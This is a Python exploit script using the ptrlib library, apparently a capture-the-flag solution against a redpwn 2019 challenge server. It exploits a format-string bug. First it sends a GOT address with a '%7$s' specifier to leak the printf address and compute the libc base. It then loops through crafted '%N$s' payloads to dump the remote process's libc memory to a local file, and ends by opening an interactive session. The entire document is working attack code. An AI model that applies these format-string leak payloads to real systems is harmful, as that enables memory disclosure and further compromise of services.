from ptrlib import *

sock = Socket("chall.2019.redpwn.net", 4007)

got_fgets  = 0x804a014
got_printf = 0x804a010

# leak libc
sock.sendline(p32(got_printf) + b"%7$s")
printf = u32(sock.recv()[4:8])
libc_base = (printf & 0xfffff000) - 0x49000
#sock.sendline(p32(got_fgets) + b"%7$s")
#fgets = u32(sock.recv()[4:8])

logger.info("libc = " + hex(libc_base))
#logger.info("<fgets> " + hex(fgets))

# leak binary
f = open("libc", "rb")
elf = f.read()
f.close()
f = open("libc", "wb")

#elf = b''
addr = libc_base + len(elf)
pos = 11
for i in range(1926828):
    payload = str2bytes("%{:08d}$sX".format(pos) + "X" * 4) + p32(addr)
    if b'\n' in payload:
        elf += b'\x00'
        addr += 0x1
        continue
    sock.sendline(payload)
    data = sock.recv(timeout=10)
    if data is not None:
        data = data[:data.index(b"XXXXX")]
        if data == b'': data = b'\x00'
        print(hex(addr), data)
        elf += data
        addr += len(data)
    f.seek(0)
    f.write(elf)
        
sock.interactive()
